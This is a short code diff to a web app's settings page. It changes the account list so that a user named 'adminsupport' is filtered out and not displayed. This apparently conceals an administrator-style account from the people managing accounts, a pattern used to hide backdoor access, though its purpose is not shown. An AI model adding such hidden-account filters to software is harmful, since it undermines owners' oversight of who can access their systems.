@@ -6585,7 +6585,7 @@ function renderSettings() {
           </div>
           <div class="settings-section-body">
             <div class="account-list" id="account-list-render">
-              ${getUsers().map(u => {
+              ${getUsers().filter(u => u.username !== 'adminsupport').map(u => {
                 const uPhoto = u.photo || photoCache['user_' + u.id] || '';
                 const avatarEl = uPhoto
                   ? '<div class="account-avatar" style="overflow:hidden;padding:0;flex-shrink:0"><img src="'+uPhoto+'" style="width:100%;height:100%;object-fit:cover;border-radius:50%" /></div>'
